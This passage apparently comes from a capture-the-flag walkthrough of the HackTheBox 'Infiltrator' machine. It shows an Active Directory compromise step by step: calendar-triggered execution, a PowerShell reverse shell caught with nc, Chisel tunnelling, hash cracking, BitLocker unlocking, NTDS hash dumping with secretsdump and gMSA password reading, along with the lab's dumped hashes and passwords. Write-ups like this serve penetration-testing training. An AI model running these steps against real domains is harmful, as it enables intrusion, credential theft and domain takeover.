/\u003e\u003c/div\u003e\u003cdiv class=\u0027msg_body\u0027 \u003eO.martinez : m@rtinez@1996!\u003c/div\u003e\u003cbr /\u003e\u003c/div\u003e\u003c/div\u003e"}

```

The structure of the response is basically:

```

{"success":true,"logs": "[HTML data]"}

```

I’ll save the logs to a file:

```

oxdf@hacky$ proxychains -q curl -H "API-KEY: 558R501T5I6024Y8JV3B7KOUN1A518GG" 'localhost:14125/api/chatrooms/logs?roomkey=20240220014618@conference.com&fromdate=2010/01/01&todate=2024/09/01' -s | jq .logs -r > Chiefs_Marketing_chat.html

```

And open it in Firefox:

![image-20240907072917494](/img/image-20240907072917494.png)

There’s the password.

### Output Messenger

#### Auth

These creds don’t work for SMB or WinRM or RDP:

```

oxdf@hacky$ netexec smb infiltrator.htb -u o.martinez -p 'm@rtinez@1996!'
SMB         10.10.11.31     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.31     445    DC01             [-] infiltrator.htb\o.martinez:m@rtinez@1996! STATUS_LOGON_FAILURE 
oxdf@hacky$ netexec winrm infiltrator.htb -u o.martinez -p 'm@rtinez@1996!'
WINRM       10.10.11.31     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:infiltrator.htb)
WINRM       10.10.11.31     5985   DC01             [-] infiltrator.htb\o.martinez:m@rtinez@1996!
oxdf@hacky$ netexec rdp infiltrator.htb -u o.martinez -p 'm@rtinez@1996!'
RDP         10.10.11.31     3389   DC01             [*] Windows 10 or Windows Server 2016 Build 17763 (name:DC01) (domain:infiltrator.htb) (nla:True)
RDP         10.10.11.31     3389   DC01             [-] infiltrator.htb\o.martinez:m@rtinez@1996! (STATUS_LOGON_FAILURE)

```

But they do work to get into Output Messenger.

![image-20240907074859370](/img/image-20240907074859370.png)

#### Enumeration

There’s nothing new in the chats as O.Martinez that I haven’t seen already. They do have a lot of entries on their calendar:

![image-20240907075924291](/img/image-20240907075924291.png)

These reminders are probably what is popping up every day as they are set to open a website:

![image-20240907080145432](/img/image-20240907080145432.png)

#### Run Program

The worst part of this box in my opinion is that I will be very stuck here until I try the Windows Output Messenger client. In Linux, the options for “Actions” are:

![image-20240907080303819](/img/image-20240907080303819.png)

However, when I switch to Windows:

![image-20240907092606748](/img/image-20240907092606748.png)

The easiest way I found to do this was to stop my Chisel proxy and restart it forwarding three ports:

```
*Evil-WinRM* PS C:\programdata> .\c.exe client 10.10.14.6:8000 R:14121:127.0.0.1:14121 R:14125:127.0.0.1:14125 R:14126:127.0.0.1:14126
c.exe : 2024/09/07 06:21:13 client: Connecting to ws://10.10.14.6:8000
2024/09/07 06:21:13 client: Connected (Latency 29.8624ms)

```

These listen on 0.0.0.0 on my VM Linux VM. Now in my Windows VM, when it asks for a server, I’ll give it the Linux IP:

![image-20240907092431935](/img/image-20240907092431935.png)

### Calendar Execution

#### Ping POC

I’ll create a simple `.bat` file on my host and upload it to Infiltrator:

```
*Evil-WinRM* PS C:\programdata> upload ping_test.bat
                                        
Info: Uploading /media/sf_CTFs/hackthebox/infiltrator-10.10.11.31/ping_test.bat to C:\programdata\ping_test.bat
                                        
Data: 28 bytes of 28 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\programdata> type ping_test.bat
ping -n 1 10.10.14.6

```

It’s important not to name it `ping.bat`, or the `ping` will try to run that, starting a loop.

I’ll run it to make sure it works:

```
*Evil-WinRM* PS C:\programdata> .\ping_test.bat

C:\programdata>ping -n 1 10.10.14.6

Pinging 10.10.14.6 with 32 bytes of data:
Reply from 10.10.14.6: bytes=32 time=22ms TTL=63

Ping statistics for 10.10.14.6:
    Packets: Sent = 1, Received = 1, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 22ms, Maximum = 22ms, Average = 22ms

```

At my host, there’s an ICMP packet:

```

oxdf@hacky$ sudo tcpdump -ni tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
09:32:56.496522 IP 10.10.11.31 > 10.10.14.6: ICMP echo request, id 1, seq 1909, length 40
09:32:56.496531 IP 10.10.14.6 > 10.10.11.31: ICMP echo reply, id 1, seq 1909, length 40

```

In Output, I’ll create a calendar event one minute from now:

![image-20240907093747663](/img/image-20240907093747663.png)

I will have to have a file on my computer at `\programdata\ping_test.bat` for it to save the event, but that’s easy to create. Right at that time, I get a ping:

```

09:35:54.651952 IP 10.10.11.31 > 10.10.14.6: ICMP echo request, id 1, seq 1914, length 40
09:35:54.651968 IP 10.10.14.6 > 10.10.11.31: ICMP echo reply, id 1, seq 1914, length 40

```

#### Shell

I’ll grab a PowerShell #3 Base64 reverse shell one liner from [revshells.com](https://www.revshells.com/) and put it into a file named `rev.bat`. I’ll upload it to Infiltrator:

```
*Evil-WinRM* PS C:\programdata> upload rev.bat
                                        
Info: Uploading /media/sf_CTFs/hackthebox/infiltrator-10.10.11.31/rev.bat to C:\programdata\rev.bat
                                        
Data: 1796 bytes of 1796 bytes copied
                                        
Info: Upload successful!

```

I’ll create another event for soon:

![image-20240907094147990](/img/image-20240907094147990.png)

When the time rolls around, I get a shell:

```

oxdf@hacky$ rlwrap -cAr nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.31 50279

PS C:\Windows\system32> whoami
infiltrator\o.martinez

```

## Auth as lan\_mangment

### Enumeration

#### BloodHound

Checking O.Martinez in BloodHound, they don’t have any new controls (I already own M.Harris):

![image-20240907101843036](/img/image-20240907101843036.png)

They can RDP into DC01:

![image-20240907101812678](/img/image-20240907101812678.png)

I’ll need a password to do this.

#### Filesystem

O.Martinez’s home directory is relatively empty as well. I’ll check the `AppData` directory for Output here as well, and there’s a PCAP file:

```

PS C:\Users\O.martinez\appdata\roaming\Output Messenger\FAAA\Received Files\203301> ls

    Directory: C:\Users\O.martinez\appdata\roaming\Output Messenger\FAAA\Received Files\203301

Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        2/23/2024   4:10 PM         292244 network_capture_2024.pcapng

```

I’ll download that (the easiest way I found was to copy it to `programdata` and download it from an Evil WinRM session).

### network\_capture\_2024.pcapng

#### Overview

I’ll open the file in Wireshark and get an idea for what’s in it. There are 237 packets, which suggests no noise:

![image-20240907095947942](/img/image-20240907095947942.png)

Statistics –> Protocol Hierarchy shows it’s mostly HTTP and TLS:

![image-20240907100059619](/img/image-20240907100059619.png)

Looking at Statistics –> Conversations, on the TCP tab, shows that 192.168.1128.232 is the host where the collection is being done:

![image-20240907100217695](/img/image-20240907100217695.png)

There’s HTTP(S) traffic, and then a bunch of connections to TCP 5000 on another host with a private IP, 192.168.1.106.

#### Flask File Hosting

Following the first stream to 192.168.1.106:5000, it’s an HTTP request for a page that calls itself “File Hosting”:

![image-20240907100438268](/img/image-20240907100438268.png)

At the bottom of the page is this footer:

![image-20240907100529090](/img/image-20240907100529090.png)

It’s a match on [this repo](https://github.com/bennyscripts/flask-file-hosting).

The next request is a POST to `/login`:

![image-20240907100642524](/img/image-20240907100642524.png)

The password is “securepassword”, which matches the default from the repo:

![image-20240907101538873](/img/image-20240907101538873.png)

The login request returns a redirect to `/files`.

The next stream is a GET for `/files`. At the top of the page, there’s an alert about the password being the default:

![image-20240907101402048](/img/image-20240907101402048.png)

There’s also HTML indicating there’s one file uploaded:

![image-20240907100856338](/img/image-20240907100856338.png)

It’s named `BitLocker-backup.7z`. A few streams later, there’s a GET to `/view/raw/BitLocker-backup.7z`:

![image-20240907101051931](/img/image-20240907101051931.png)

Under File –> Export Objects –> HTTP, the dialog shows packet 107 having the 209 kB file:

![image-20240907101220052](/img/image-20240907101220052.png)

I’ll save it to my host.

A few streams later, there’s a POST to `/api/change_auth_token`, with a new password set in the headers:

![image-20240907101458994](/img/image-20240907101458994.png)

#### Validate Password

That password works for O.Martinez over SMB:

```

oxdf@hacky$ netexec smb infiltrator.htb -u o.martinez -p 'M@rtinez_P@ssw0rd!'
SMB         10.10.11.31     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.31     445    DC01             [+] infiltrator.htb\o.martinez:M@rtinez_P@ssw0rd!

```

It does not work over WinRM, but does work over RDP (which matches what BloodHound showed):

```

oxdf@hacky$ netexec winrm infiltrator.htb -u o.martinez -p 'M@rtinez_P@ssw0rd!'
WINRM       10.10.11.31     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:infiltrator.htb)
WINRM       10.10.11.31     5985   DC01             [-] infiltrator.htb\o.martinez:M@rtinez_P@ssw0rd!
oxdf@hacky$ netexec rdp infiltrator.htb -u o.martinez -p 'M@rtinez_P@ssw0rd!'
RDP         10.10.11.31     3389   DC01             [*] Windows 10 or Windows Server 2016 Build 17763 (name:DC01) (domain:infiltrator.htb) (nla:True)
RDP         10.10.11.31     3389   DC01             [+] infiltrator.htb\o.martinez:M@rtinez_P@ssw0rd! (Pwn3d!)

```

### BitLocker-backup.7z

#### Get Access

Trying to extract files shows that the archive is password protected:

```

oxdf@hacky$ 7z x BitLocker-backup.7z 
...[snip]...
Enter password (will not be echoed):

```

None of the passwords I have so far work.

I’ll create a hash using `7z2john.pl` from [John](https://github.com/openwall/john/blob/bleeding-jumbo/run/7z2john.pl) (it needs `apt-get install -y libcompress-raw-lzma-perl`):

```

oxdf@hacky$ /opt/john/run/7z2john.pl BitLocker-backup.7z | tee BitLocker-backup.7z.hash
ATTENTION: the hashes might contain sensitive encrypted data. Be careful when sharing or posting these hashes
BitLocker-backup.7z:$7z$2$19$0$$16$3e870837c60379...[snip]...6fddb8ec64fc2539a$792371$10

```

The hash is *very* long, and it starts with the filename and then a `:` and then the hash.

I’ll pass it to `hashcat` with the `--user` flag and `rockyou.txt`, and it finds the format and cracks it relatively quickly:

```

$ hashcat BitLocker-backup.7z.hash --user /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt 
hashcat (v6.2.6) starting in autodetect mode
...[snip]...
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

11600 | 7-Zip | Archive

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

This hash-mode is known to emit multiple valid candidates for the same hash.
Use --keep-guessing to continue attack after finding the first crack.
...[snip]...
$7z$2$19$0$$16$3e870837c60379...[snip]...:zipper
...[snip]...

```

The password is “zipper”.

#### Files

The archive has a directory with a single HTML page:

```

oxdf@hacky$ 7z l BitLocker-backup
...[snip]...

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2024-02-19 14:11:00 D....            0            0  BitLocker-backup
2024-02-20 08:51:45 ....A       792371       209056  BitLocker-backup/Microsoft account _ Clés de récupération BitLocker.html
------------------- ----- ------------ ------------  ------------------------
2024-02-20 08:51:45             792371       209056  1 files, 1 folders

```

The page is in French, but it’s clear that it’s a BitLocker backup page, including the key:

![image-20240907105039176](/img/image-20240907105039176.png)

### RDP

#### Connect

I’m able to connect with `xfreerdp /u:INFILTRATOR.HTB\\o.martinez /p:M@rtinez_P@ssw0rd! /v:dc01.infiltrator.htb`:

![image-20240907102430498](/img/image-20240907102430498.png)

Output is running, as is the window from my `rev.bat` that provided a shell. Shortly after logging in, a popup shows that my session is limited:

![image-20240907102811508](/img/image-20240907102811508.png)

#### Access E:

Opening Explorer, there’s an `E:` that’s locked:

![image-20240907102827676](/img/image-20240907102827676.png)

Double-clicking it pops a Bitlocker prompt:

![image-20240907102900120](/img/image-20240907102900120.png)

I’ll click “More options”:

![image-20240907105149400](/img/image-20240907105149400.png)

“Enter recovery key” offers a field for the key:

![image-20240907105215257](/img/image-20240907105215257.png)

Entering the key from the backup works:

![image-20240907105242017](/img/image-20240907105242017.png)

The lock is now open.

#### Exfil

The `E:` drive has a single folder:

![image-20240907105942646](/img/image-20240907105942646.png)

Because my time is limited, I’ll open a command terminal and compress it all:

```

E:\>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS E:\> Compress-Archive -Path 'E:\Windows Server 2012 R2 - Backups\' -DestinationPath C:\ProgramData\Edrive.zip

```

From an Evil-WinRM session, I’ll download that archive.

#### Recover Backup

Looking at the archive, one file jumps out immediately:

```

oxdf@hacky$ unzip -l Edrive.zip 
Archive:  Edrive.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
        0  2024-09-07 08:08   Windows Server 2012 R2 - Backups\Files\
        0  2024-09-07 08:08   Windows Server 2012 R2 - Backups\PerfLogs\
        0  2024-09-07 08:08   Windows Server 2012 R2 - Backups\Program\
        0  2024-09-07 08:08   Windows Server 2012 R2 - Backups\Program Files (x86)\
        0  2024-09-07 08:08   Windows Server 2012 R2 - Backups\Users\
        0  2024-09-07 08:08   Windows Server 2012 R2 - Backups\Windows\
  2055137  2024-02-25 06:23   Windows Server 2012 R2 - Backups\Users\Administrator\Documents\Backup_Credentials.7z
      208  2024-02-24 20:47   Windows Server 2012 R2 - Backups\Users\Administrator\Favorites\Bing.url
      461  2024-02-24 20:47   Windows Server 2012 R2 - Backups\Users\Administrator\Links\Desktop.lnk
      906  2024-02-24 20:47   Windows Server 2012 R2 - Backups\Users\Administrator\Links\Downloads.lnk
      363  2024-02-24 20:47   Windows Server 2012 R2 - Backups\Users\Administrator\Links\RecentPlaces.lnk
      208  2024-02-24 20:47   Windows Server 2012 R2 - Backups\Users\m.harris\Favorites\Bing.url
      461  2024-02-24 20:47   Windows Server 2012 R2 - Backups\Users\m.harris\Links\Desktop.lnk
      906  2024-02-24 20:47   Windows Server 2012 R2 - Backups\Users\m.harris\Links\Downloads.lnk
      363  2024-02-24 20:47   Windows Server 2012 R2 - Backups\Users\m.harris\Links\RecentPlaces.lnk
      208  2024-02-24 20:47   Windows Server 2012 R2 - Backups\Users\o.martinez\Favorites\Bing.url
      461  2024-02-24 20:47   Windows Server 2012 R2 - Backups\Users\o.martinez\Links\Desktop.lnk
      906  2024-02-24 20:47   Windows Server 2012 R2 - Backups\Users\o.martinez\Links\Downloads.lnk
      363  2024-02-24 20:47   Windows Server 2012 R2 - Backups\Users\o.martinez\Links\RecentPlaces.lnk
      208  2024-02-24 20:47   Windows Server 2012 R2 - Backups\Users\winrm_svc\Favorites\Bing.url
      461  2024-02-24 20:47   Windows Server 2012 R2 - Backups\Users\winrm_svc\Links\Desktop.lnk
      906  2024-02-24 20:47   Windows Server 2012 R2 - Backups\Users\winrm_svc\Links\Downloads.lnk
      363  2024-02-24 20:47   Windows Server 2012 R2 - Backups\Users\winrm_svc\Links\RecentPlaces.lnk
---------                     -------
  2062889                     23 files

```

`Backup_Credentials.7z` contains the information that stores the hashes for the domain:

```

oxdf@hacky$ 7z l Windows\ Server\ 2012\ R2\ -\ Backups/Users/Administrator/Documents/Backup_Credentials.7z
...[snip]...

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2024-02-25 10:12:32 D....            0            0  Active Directory
2024-02-25 10:12:34 D....            0            0  registry
2024-02-25 10:12:34 ....A     35667968      2054887  Active Directory/ntds.dit
2024-02-25 10:00:07 ....A       262144               registry/SECURITY
2024-02-25 10:00:07 ....A     12582912               registry/SYSTEM
------------------- ----- ------------ ------------  ------------------------
2024-02-25 10:12:34           48513024      2054887  3 files, 2 folders

```

It isn’t password protected.

### Backup Hashes

#### Dump Hashes

The obvious thing to try here is dumping hashes from the NTDS file using `secretsdump`:

```

oxdf@hacky$ secretsdump.py -security registry/SECURITY -system registry/SYSTEM -ntds Active\ Directory/ntds.dit LOCAL
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0xd7e7d8797c1ccd58d95e4fb25cb7bdd4
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
$MACHINE.ACC:plain_password_hex:4b90048ad6028aae98f66484009266d4efa571d48a8aa6b771d69d20aba16ddb7e0a0ffe9378a1ac7b31a812f0760fe2a8ce66ff6a0ff772155a29baa59b4407a95a920d0904cba6f8b19b6393f1551a476f991bbedaa66880e60611482a81b31b34c55c77d0e0d1792e3b18cdc9d39e0b776e7ef082399b096aaa2e8d93eb1f0340fd5f6e138da2580d1f581ff9426dce99a901a1bf88ad3f19a5bc4ce8ff17fdbb0a04bb29f13dc46177a6d8cd61bf91f8342e33b5362daecbb888df22ce467aa9f45a9dc69b03d116eeac89857d17f3f44f4abc34165b296a42b3b3ff5ab26401b5734fab6ad142d7882715927e45
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:fe4767309896203c581b9fc3c5e23b00
[*] DefaultPassword
(Unknown User):ROOT#123
[*] DPAPI_SYSTEM
dpapi_machinekey:0x81f5247051ff9535ad8299f0efd531ff3a5cb688
dpapi_userkey:0x79d13d91a01f6c38437c526396febaf8c1bc6909
[*] NL$KM
 0000   2E 8A EC D8 ED 12 C6 ED  26 8E B0 9B DF DA 42 B7   ........&.....B.
 0010   49 DA B0 07 05 EE EA 07  05 02 04 0E AD F7 13 C2   I...............
 0020   6C 6D 8E 19 1A B0 51 41  7C 7D 73 9E 99 BA CD B1   lm....QA|}s.....
 0030   B7 7A 3E 0F 59 50 1C AD  8F 14 62 84 3F AC A9 92   .z>.YP....b.?...
NL$KM:2e8aecd8ed12c6ed268eb09bdfda42b749dab00705eeea070502040eadf713c26c6d8e191ab051417c7d739e99bacdb1b77a3e0f59501cad8f1462843faca992
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: d27644ab3070f72ec264fcb413d75299
[*] Reading and decrypting hashes from Active Directory/ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7bf62b9c45112ffdadb7b6b4b9299dd2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC$:1001:aad3b435b51404eeaad3b435b51404ee:fe4767309896203c581b9fc3c5e23b00:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:454fcbc37690c6e4628ab649e8e285a5:::
infiltrator.htb\winrm_svc:1104:aad3b435b51404eeaad3b435b51404ee:84287cd16341b91eb93a58456b73e30f:::
infiltrator.htb\lan_managment:1105:aad3b435b51404eeaad3b435b51404ee:e8ade553d9b0cb1769f429d897c92931:::
infiltrator.htb\M.harris:1106:aad3b435b51404eeaad3b435b51404ee:fc236589c448c620417b15597a3d3ca7:::
infiltrator.htb\D.anderson:1107:aad3b435b51404eeaad3b435b51404ee:627a2cb0adc7ba12ea11174941b3da88:::
infiltrator.htb\L.clark:1108:aad3b435b51404eeaad3b435b51404ee:627a2cb0adc7ba12ea11174941b3da88:::
infiltrator.htb\O.martinez:1109:aad3b435b51404eeaad3b435b51404ee:eb86d7bcb30c8eac1bdcae5061e2dff4:::
infiltrator.htb\A.walker:1110:aad3b435b51404eeaad3b435b51404ee:46389d8dfdfcf0cbe262a71f576e574b:::
infiltrator.htb\K.turner:1111:aad3b435b51404eeaad3b435b51404ee:48bcd1cdc870c6285376a990c2604531:::
infiltrator.htb\E.rodriguez:1112:aad3b435b51404eeaad3b435b51404ee:b1918c2ce6a62f4eee11c51b6e2e965a:::
[*] Kerberos keys from Active Directory/ntds.dit
DC$:aes256-cts-hmac-sha1-96:09b3e08f549e92e0b16ed45f84b25cc6d0c147ff169ce059811a3ed9e6957176
DC$:aes128-cts-hmac-sha1-96:d2a3d7c9ee6965b1e3cd710ed1ceed0f
DC$:des-cbc-md5:5eea34b3317aea91
krbtgt:aes256-cts-hmac-sha1-96:f6e0a1bd3a180f83472cd2666b28de969442b7745545afb84bbeaa9397cb9b87
krbtgt:aes128-cts-hmac-sha1-96:7874dff8138091d6c344381c9c758540
krbtgt:des-cbc-md5:10bfc49ecd3b58d9
infiltrator.htb\winrm_svc:aes256-cts-hmac-sha1-96:ae473ae7da59719ebeec93c93704636abb7ee7ff69678fdec129afe2fc1592c4
infiltrator.htb\winrm_svc:aes128-cts-hmac-sha1-96:0faf5e0205d6f43ae37020f79f60606a
infiltrator.htb\winrm_svc:des-cbc-md5:7aba231386c2ecf8
infiltrator.htb\lan_managment:aes256-cts-hmac-sha1-96:6fcd2f66179b6b852bb3cc30f2ba353327924081c47d09bc5a9fafc623016e96
infiltrator.htb\lan_managment:aes128-cts-hmac-sha1-96:48f45b8eb2cbd8dbf578241ee369ddd9
infiltrator.htb\lan_managment:des-cbc-md5:31c83197ab944052
infiltrator.htb\M.harris:aes256-cts-hmac-sha1-96:20433af8bf6734568f112129c951ad87f750dddf092648c80816d5cb42ed0f49
infiltrator.htb\M.harris:aes128-cts-hmac-sha1-96:2ee0cd05c3fa205a92e6837ff212b7a0
infiltrator.htb\M.harris:des-cbc-md5:3ee3688376f2e5ce
infiltrator.htb\D.anderson:aes256-cts-hmac-sha1-96:42447533e9f1c9871ddd2137def662980e677a748b5d184da910d3c4daeb403f
infiltrator.htb\D.anderson:aes128-cts-hmac-sha1-96:021e189e743a78a991616821138e2e69
infiltrator.htb\D.anderson:des-cbc-md5:1529a829132a2345
infiltrator.htb\L.clark:aes256-cts-hmac-sha1-96:dddc0366b026b09ebf0ac3e7a7f190b491c4ee0d7976a4c3b324445485bf1bfc
infiltrator.htb\L.clark:aes128-cts-hmac-sha1-96:5041c75e19de802e0f7614f57edc8983
infiltrator.htb\L.clark:des-cbc-md5:cd023d5d70e6aefd
infiltrator.htb\O.martinez:aes256-cts-hmac-sha1-96:4d2d8951c7d6eba4edaf172fd0f7b78ab7260e3d513bf2ff387c70c85d912a2f
infiltrator.htb\O.martinez:aes128-cts-hmac-sha1-96:33fdf738e13878a8101e3bf929a5a120
infiltrator.htb\O.martinez:des-cbc-md5:f80bc202755d2cfd
infiltrator.htb\A.walker:aes256-cts-hmac-sha1-96:e26c97600c6f44990f18480087a685e0f1c71bcfbc8413dce6764ccf77df448a
infiltrator.htb\A.walker:aes128-cts-hmac-sha1-96:768672b783131ed963b9deeac0a6d2e4
infiltrator.htb\A.walker:des-cbc-md5:a7e6cde06d6e153b
infiltrator.htb\K.turner:aes256-cts-hmac-sha1-96:2c816a32b395f67df520bc734f7ea8e4df64a9610ffb3ef43e0e9df69b9df8b8
infiltrator.htb\K.turner:aes128-cts-hmac-sha1-96:b20f41c0d3b8fb6e1b793af4a835109b
infiltrator.htb\K.turner:des-cbc-md5:4607b9eaec6838ba
infiltrator.htb\E.rodriguez:aes256-cts-hmac-sha1-96:9114030dd2a57970530eda4ce0aa6b14f88f2be44f6d920de31eb6ee6f1587b5
infiltrator.htb\E.rodriguez:aes128-cts-hmac-sha1-96:ddd37cf706781414885f561c3b469d0c
infiltrator.htb\E.rodriguez:des-cbc-md5:9d5bdaf2cd26165d
[*] Cleaning up...

```

I’ll grab the NTLMs into a file, and use it to create a users file and a hashes file:

```

oxdf@hacky$ cat ntlms.txt | cut -d: -f1  > users
oxdf@hacky$ cat ntlms.txt | cut -d: -f3-4  > hashes

```

I’ll try these with `netexec`:

```

oxdf@hacky$ netexec smb infiltrator.htb -u users -H hashes --no-bruteforce
SMB         10.10.11.31     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.31     445    DC01             [-] infiltrator.htb\Administrator:7bf62b9c45112ffdadb7b6b4b9299dd2 STATUS_LOGON_FAILURE 
SMB         10.10.11.31     445    DC01             [-] infiltrator.htb\Guest:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_ACCOUNT_DISABLED 
SMB         10.10.11.31     445    DC01             [-] infiltrator.htb\DC$:fe4767309896203c581b9fc3c5e23b00 STATUS_LOGON_FAILURE 
SMB         10.10.11.31     445    DC01             [-] infiltrator.htb\krbtgt:454fcbc37690c6e4628ab649e8e285a5 STATUS_LOGON_FAILURE 
SMB         10.10.11.31     445    DC01             [-] infiltrator.htb\winrm_svc:84287cd16341b91eb93a58456b73e30f STATUS_LOGON_FAILURE 
SMB         10.10.11.31     445    DC01             [-] infiltrator.htb\lan_managment:e8ade553d9b0cb1769f429d897c92931 STATUS_LOGON_FAILURE 
SMB         10.10.11.31     445    DC01             [-] infiltrator.htb\M.harris:fc236589c448c620417b15597a3d3ca7 STATUS_ACCOUNT_RESTRICTION 
SMB         10.10.11.31     445    DC01             [-] infiltrator.htb\D.anderson:627a2cb0adc7ba12ea11174941b3da88 STATUS_ACCOUNT_RESTRICTION 
SMB         10.10.11.31     445    DC01             [+] infiltrator.htb\L.clark:627a2cb0adc7ba12ea11174941b3da88 

```

L.Clark works, but I know their password. M.Harris and D.Anderson are disabled, but I’ve already compromised both of them as well.

#### NTDS Enumeration

The NTDS file contains more than just the hashes. [NTDS.Sqlite](https://github.com/almandin/ntdsdotsqlite) is a neat tool to take all the information from the `ntds.dit` file and convert it to a SQLite DB for enumeration. It installs with `pipx install ntdsdotsqlite`. Then it takes the `ntds.dit` file and the `SYSTEM` hive:

```

oxdf@hacky$ ntdsdotsqlite Active\ Directory/ntds.dit --system registry/SYSTEM -o ntds.sqlite
100%|██████████████████████████████████| 3823/3823 [00:00<00:00, 13651.90it/s]

```

The resulting DB file has eight tables:

```

oxdf@hacky$ sqlite3 ntds.sqlite 
SQLite version 3.45.1 2024-01-30 16:01:20
Enter ".help" for usage hints.
sqlite> .tables
containers            groups                trusted_domains     
domain_dns            machine_accounts      user_accounts       
domains               organizational_units

```

In the `user_accounts` table, there’s the same kind of information I typically see in LDAP. The lan\_managment account has an interesting description (and a misspelled name):

```

sqlite> select commonname,description from user_accounts ;
Administrator|Built-in account for administering the computer/domain
Guest|Built-in account for guest access to the computer/domain
krbtgt|Key Distribution Center Service Account
winrm_svc|User Security and Management Specialist
lan_managment|l@n_M@an!1331
M.harris|Head of Development Department

D.anderson|
L.clark|
O.martinez|
A.walker|
K.turner|
E.rodriguez|

```

#### Validate Creds

The creds work for lan\_managment for SMB and RDP, but not WinRM:

```

oxdf@hacky$ netexec smb infiltrator.htb -u lan_managment -p 'l@n_M@an!1331'
SMB         10.10.11.31     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.31     445    DC01             [+] infiltrator.htb\lan_managment:l@n_M@an!1331 
oxdf@hacky$ netexec winrm infiltrator.htb -u lan_managment -p 'l@n_M@an!1331'
WINRM       10.10.11.31     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:infiltrator.htb)
WINRM       10.10.11.31     5985   DC01             [-] infiltrator.htb\lan_managment:l@n_M@an!1331
oxdf@hacky$ netexec rdp infiltrator.htb -u lan_managment -p 'l@n_M@an!1331'
RDP         10.10.11.31     3389   DC01             [*] Windows 10 or Windows Server 2016 Build 17763 (name:DC01) (domain:infiltrator.htb) (nla:True)
RDP         10.10.11.31     3389   DC01             [+] infiltrator.htb\lan_managment:l@n_M@an!1331

```

It says RDP works, but I wasn’t able to get a connection.

## Auth as infiltrator\_svc

### BloodHound

lan\_managment has `ReadGMSAPassword` over the infiltrator\_svc$ account:

![image-20240907154550774](/img/image-20240907154550774.png)

### Dump Hash

A group Managed Service Account (gMSA) is an account that has it’s password managed automatically by the domain. It allows these accounts to set very strong passwords, and gives permissions to other accounts to access them as needed. I’ve shown this a couple times, most recently on [Rebound](/2024/03/30/htb-rebound.html#auth-as-delegator).

The simplest way to grab the NTLM for the target account is using `netexec`:

```

oxdf@hacky$ netexec ldap infiltrator.htb -u lan_managment -p 'l@n_M@an!1331' --gmsa
SMB         10.10.11.31     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:False)
LDAPS       10.10.11.31     636    DC01             [+] infiltrator.htb\lan_managment:l@n_M@an!1331 
LDAPS       10.10.11.31     636    DC01             [*] Getting GMSA Passwords
LDAPS       10.10.11.31     636    DC01             Account: infiltrator_svc$     NTLM: 9ae7de37439f359608eccf2cff5d32b9

```

There’s also tools like [gMSADumper](https://github.com/micahvandeusen/gMSADumper) that can also do it:

```

oxdf@hacky$ python gMSADumper.py -u lan_managment -p 'l@n_M@an!1331' -d infiltrator.htb
Users or groups who can read password for infiltrator_svc$:
 > lan_managment
infiltrator_svc$:::9ae7de37439f359608eccf2cff5d32b9
infiltrator_svc$:aes256-cts-hmac-sha1-96:efa1fa0fcbe57177f6f89d8513d16cbbb673ed8b85a137e5eb06baefdd3c0d27
infiltrator_svc$:aes128-cts-hmac-sha1-96:4d556ec8ebc73e358d05430c7696f1f0

```

### Validate Hash

`netexec` shows the hash works for SMB and LDAP:

```

oxdf@hacky$ netexec smb infiltrator.htb -u 'infiltrator_svc$' -H 9ae7de37439f359608eccf2cff5d32b9
SMB         10.10.11.31     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.31     445    DC01             [+] infiltrator.htb\infiltrator_svc$:9ae7de37439f359608eccf2cff5d32b9 
oxdf@hacky$ netexec ldap infiltrator.htb -u 'infiltrator_svc$' -H 9ae7de37439f359608eccf2cff5d32b9
SMB         10.10.11.31     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.31     389    DC01             [+] infiltrator.htb\infiltrator_svc$:9ae7de37439f359608eccf2cff5d32b9 

```

It doesn’t work over WinRM, and RDP shows a false positive:

```

